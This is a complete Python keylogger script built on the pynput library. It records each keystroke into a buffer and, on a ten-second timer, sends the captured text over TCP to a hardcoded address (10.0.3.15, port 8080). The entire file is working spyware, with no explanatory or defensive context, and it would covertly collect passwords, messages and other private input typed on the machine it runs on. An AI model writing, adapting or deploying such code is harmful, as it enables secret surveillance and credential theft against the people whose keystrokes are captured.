# pip install pynput
from pynput import keyboard
import socket
import threading

text = ""

ip_address = "10.0.3.15"
port_number = 8080
time_interval = 10

def send_tcp_data():
    global text
    try:
        if not text:
            pass
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip_address, port_number))
            s.sendall(text.encode(errors="ignore"))
            s.close()
            text = ""  # clear buffer after sending

        timer = threading.Timer(time_interval, send_tcp_data)
        timer.start()
    except Exception as e:
        print("Connection failed:", e)

def on_press(key):
    global text

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key in (keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
        pass
    elif key == keyboard.Key.backspace:
        text = text[:-1]
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")

with keyboard.Listener(on_press=on_press) as listener:
    send_tcp_data()
    listener.join()
